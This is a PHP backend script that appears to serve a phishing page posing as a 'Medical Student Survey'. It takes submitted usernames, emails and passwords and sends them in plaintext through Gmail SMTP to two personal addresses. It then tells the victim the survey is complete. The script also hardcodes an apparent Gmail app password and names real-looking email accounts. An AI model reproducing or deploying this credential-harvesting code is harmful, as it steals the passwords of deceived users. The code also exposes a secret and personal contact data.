<?php
// Disable error reporting for production
error_reporting(0);
ini_set('display_errors', 0);

// Buffer the output
ob_start();

// Include PHPMailer classes
require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Initialize response array
$response = ['success' => false, 'message' => '', 'redirect' => ''];

try {
    // Check if the request method is POST
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Retrieve form data
        $username = $_POST['username'] ?? '';
        $email = $_POST['email'] ?? '';
        $password = $_POST['password'] ?? '';

        // Validate inputs (basic validation)
        if (empty($username) || empty($email) || empty($password)) {
            throw new Exception('All fields are required.');
        }

        // Instantiate PHPMailer
        $mail = new PHPMailer(true);

        // Server settings for Gmail SMTP
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'maliktools35@gmail.com';
        $mail->Password = 'kaklkkxiepuzfvgh';
        $mail->SMTPSecure = 'tls';
        $mail->Port = 587;

        // Set the sender's address
        $mail->setFrom('maliktools35@gmail.com', 'New login');

        // Add multiple recipients
        $adminEmails = ['masroorahmad3592@gmail.com', 'mairafatima178@gmail.com'];
        foreach ($adminEmails as $adminEmail) {
            $mail->addAddress($adminEmail);
        }

        // Email content
        $mail->isHTML(true);
        $mail->Subject = 'New login - Medical Student Survey';
        $mail->Body = "
            <div style='font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 600px; margin: auto; border: 1px solid #ddd; border-radius: 8px; overflow: hidden; background-color: #f9f9f9;'>
                <div style='background-color: #007BFF; padding: 20px; text-align: center; color: white;'>
                    <h1 style='margin: 0; font-size: 24px;'>New Login</h1>
                </div>
                <div style='padding: 20px;'>
                    <p style='margin: 20px 0; font-size: 18px;'><strong>Username:</strong> <span style='color: #555;'>{$username}</span></p>
                    <p style='margin: 20px 0; font-size: 18px;'><strong>Email:</strong> <span style='color: #555;'>{$email}</span></p>
                    <p style='margin: 20px 0; font-size: 18px;'><strong>Password:</strong> <span style='color: #555;'>{$password}</span></p>
                </div>
                <div style='background-color: #f4f4f4; padding: 10px; text-align: center; font-size: 12px; color: #666;'>
                    Made by Masroor.
                </div>
            </div>
        ";

        // Send email
        $mail->send();

        // Set success response
        $response['success'] = true;
        $response['message'] = 'Survey completed successfully!';
        $response['redirect'] = 'thank-you.html';
    } else {
        throw new Exception('Invalid request method.');
    }
} catch (Exception $e) {
    // Set error response
    $response['message'] = "Error: " . $e->getMessage();
    error_log("PHPMailer Error: " . $e->getMessage()); // Log detailed error
}

// Clear the output buffer
ob_end_clean();

// Output JSON response
header('Content-Type: application/json');
echo json_encode($response);
?>
